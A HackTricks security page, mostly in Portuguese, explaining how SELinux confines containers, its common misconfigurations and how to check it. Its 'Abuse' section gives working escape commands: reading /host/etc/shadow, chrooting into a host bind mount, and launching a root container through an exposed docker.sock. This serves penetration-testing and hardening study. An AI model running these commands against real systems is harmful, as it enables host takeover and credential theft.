# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Visão Geral

SELinux é um **sistema de Controle de Acesso Mandatório baseado em rótulos**. Todo processo e objeto relevante pode portar um contexto de segurança, e a política determina quais domínios podem interagir com quais tipos e de que forma. Em ambientes containerizados, isso normalmente significa que o runtime inicia o processo do container sob um domínio container confinado e rotula o conteúdo do container com os tipos correspondentes. Se a política estiver funcionando corretamente, o processo poderá ler e gravar aquilo que seu rótulo deve acessar, enquanto terá acesso negado a outros conteúdos do host, mesmo que esse conteúdo fique visível por meio de um ponto de montagem.

Esta é uma das proteções do lado do host mais poderosas disponíveis em implantações mainstream de containers Linux. É especialmente importante no Fedora, RHEL, CentOS Stream, OpenShift e outros ecossistemas centrados em SELinux. Nesses ambientes, um revisor que ignora o SELinux muitas vezes entenderá mal por que um caminho que parece óbvio para o comprometimento do host está na verdade bloqueado.

## AppArmor Vs SELinux

A diferença de alto nível mais simples é que o AppArmor é baseado em caminhos enquanto o SELinux é **baseado em rótulos**. Isso tem grandes consequências para a segurança de containers. Uma política baseada em caminhos pode se comportar de forma diferente se o mesmo conteúdo do host se tornar visível sob um caminho de montagem inesperado. Uma política baseada em rótulos, por outro lado, pergunta qual é o rótulo do objeto e o que o domínio do processo pode fazer com ele. Isso não torna o SELinux simples, mas o torna robusto contra uma classe de suposições envolvendo truques com caminhos que defensores às vezes fazem acidentalmente em sistemas baseados em AppArmor.

Como o modelo é orientado por rótulos, o tratamento de volumes de container e as decisões de rerotulagem são críticas para a segurança. Se o runtime ou o operador alterar os rótulos de forma ampla demais para "fazer as montagens funcionarem", a fronteira de política que deveria conter a carga de trabalho pode ficar muito mais fraca do que o pretendido.

## Laboratório

Para verificar se o SELinux está ativo no host:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Para inspecionar os rótulos existentes no host:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Para comparar uma execução normal com uma em que a rotulagem está desativada:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
Em um host com SELinux habilitado, isso é uma demonstração muito prática porque mostra a diferença entre uma carga de trabalho executando sob o domínio de container esperado e uma que foi despojada dessa camada de fiscalização.

## Runtime Usage

Podman está particularmente bem alinhado com SELinux em sistemas onde SELinux faz parte do padrão da plataforma. Rootless Podman mais SELinux é uma das bases de container mainstream mais robustas porque o processo já é não privilegiado no lado do host e ainda fica confinado pela política de MAC. Docker também pode usar SELinux onde for suportado, embora administradores às vezes o desativem para contornar atritos de rotulagem de volumes. CRI-O e OpenShift dependem fortemente de SELinux como parte de sua abordagem de isolamento de containers. Kubernetes também pode expor configurações relacionadas ao SELinux, mas seu valor obviamente depende de o SO do nó realmente suportar e aplicar o SELinux.

A lição recorrente é que SELinux não é um enfeite opcional. Nos ecossistemas construídos ao seu redor, ele faz parte da fronteira de segurança esperada.

## Misconfigurations

O erro clássico é `label=disable`. Operacionalmente, isso costuma acontecer porque um volume mount foi negado e a resposta de curto prazo mais rápida foi remover SELinux da equação em vez de corrigir o modelo de rotulagem. Outro erro comum é a rerotulagem incorreta do conteúdo do host. Operações amplas de rerotulagem podem fazer a aplicação funcionar, mas também podem expandir o que o container tem permissão para tocar muito além do originalmente pretendido.

Também é importante não confundir o SELinux **instalado** com o SELinux **efetivo**. Um host pode suportar SELinux e ainda estar em modo permissivo, ou o runtime pode não estar lançando a carga de trabalho sob o domínio esperado. Nesses casos a proteção é muito mais fraca do que a documentação pode sugerir.

## Abuse

Quando SELinux está ausente, em modo permissivo, ou amplamente desativado para a carga de trabalho, caminhos montados do host tornam-se muito mais fáceis de abusar. O mesmo bind mount que normalmente seria restringido por rótulos pode se tornar uma via direta para dados do host ou modificação do host. Isso é especialmente relevante quando combinado com mounts de volume graváveis, diretórios do runtime do container ou atalhos operacionais que expuseram caminhos sensíveis do host por conveniência.

SELinux frequentemente explica por que um breakout writeup genérico funciona imediatamente em um host mas falha repetidamente em outro, mesmo que as flags do runtime pareçam similares. O ingrediente que falta frequentemente não é um namespace ou uma capability, mas um limite de rótulo que permaneceu intacto.

A verificação prática mais rápida é comparar o contexto ativo e então sondar caminhos montados do host ou diretórios do runtime que normalmente seriam confinados por rótulos:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Se um host bind mount estiver presente e a rotulagem do SELinux tiver sido desativada ou enfraquecida, a divulgação de informações geralmente ocorre primeiro:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Se o mount for gravável e o container for efetivamente host-root do ponto de vista do kernel, o próximo passo é testar uma modificação controlada do host em vez de adivinhar:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
Em hosts com suporte a SELinux, a perda de rótulos em diretórios de estado em tempo de execução também pode expor caminhos diretos de elevação de privilégios:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Esses comandos não substituem uma full escape chain, mas deixam claro muito rapidamente se SELinux era o que impedia o acesso a dados do host ou a modificação de arquivos no host.

### Exemplo completo: SELinux desativado + Montagem do host gravável

Se SELinux labeling estiver desabilitado e o sistema de arquivos do host estiver montado como gravável em `/host`, um full host escape torna-se um caso normal de abuso de bind-mount:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Se o `chroot` for bem-sucedido, o container process agora está operando a partir do host filesystem:
```bash
id
hostname
cat /etc/passwd | tail
```
### Exemplo completo: SELinux Desativado + Diretório do runtime

Se a workload conseguir alcançar um runtime socket depois que os labels estiverem desativados, o escape pode ser delegado ao runtime:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
A observação relevante é que o SELinux frequentemente foi o controle que impedia exatamente esse tipo de acesso a host-path ou ao estado em tempo de execução.

## Verificações

O objetivo das verificações do SELinux é confirmar que o SELinux está ativado, identificar o contexto de segurança atual e verificar se os arquivos ou caminhos que lhe interessam estão realmente confinados por rótulos.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
O que é interessante aqui:

- `getenforce` should ideally return `Enforcing`; `Permissive` or `Disabled` changes the meaning of the whole SELinux section.
- Se o contexto do processo atual parecer inesperado ou muito amplo, a workload pode não estar sendo executada sob a política de container pretendida.
- Se arquivos montados no host ou diretórios de runtime tiverem rótulos que o processo pode acessar de forma muito livre, bind mounts tornam-se muito mais perigosos.

Ao revisar um container em uma plataforma com suporte a SELinux, não trate a rotulagem como um detalhe secundário. Em muitos casos é uma das principais razões pelas quais o host ainda não foi comprometido.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Depende do host | A separação SELinux está disponível em hosts com SELinux habilitado, mas o comportamento exato depende da configuração do host/daemon | `--security-opt label=disable`, reatribuição ampla de rótulos em bind mounts, `--privileged` |
| Podman | Comumente habilitado em hosts SELinux | A separação SELinux é parte normal do Podman em sistemas SELinux, a menos que seja desativada | `--security-opt label=disable`, `label=false` in `containers.conf`, `--privileged` |
| Kubernetes | Normalmente não atribuído automaticamente a nível de Pod | Existe suporte a SELinux, mas os Pods geralmente precisam de `securityContext.seLinuxOptions` ou defaults específicos da plataforma; suporte do runtime e do node é necessário | seLinuxOptions fracas ou amplas, execução em nodes permissive/disabled, políticas de plataforma que desativam a rotulagem |
| CRI-O / OpenShift style deployments | Comumente fortemente utilizado | SELinux costuma ser parte central do modelo de isolamento de nodes nesses ambientes | políticas customizadas que ampliam excessivamente o acesso, desativando a rotulagem para compatibilidade |

SELinux defaults are more distribution-dependent than seccomp defaults. On Fedora/RHEL/OpenShift-style systems, SELinux is often central to the isolation model. On non-SELinux systems, it is simply absent.
{{#include ../../../../banners/hacktricks-training.md}}
